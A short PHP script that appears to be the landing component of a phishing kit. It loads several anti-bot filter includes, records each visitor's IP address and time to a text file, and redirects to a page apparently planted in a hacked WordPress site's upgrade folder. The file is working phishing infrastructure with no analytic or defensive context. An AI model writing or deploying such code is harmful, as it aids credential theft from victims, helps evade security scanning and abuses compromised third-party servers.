<?php
   include "inc/function.inc.php";
  include "inc/filters/anti1.php";
  include "inc/filters/anti2.php";
  include "inc/filters/anti4.php";
  include "inc/filters/anti7.php";

  

	$ip = getenv("REMOTE_ADDR");
	$file = fopen("v.txt","a");
	fwrite($file,"IP=".$ip."/TIME=".gmdate ("Y-n-d")." ".gmdate ("H:i:s")."/Once\n");
header("Location: https://coritec-dz.com/wp/wp-content/upgrade/soporte-directonow/");
?>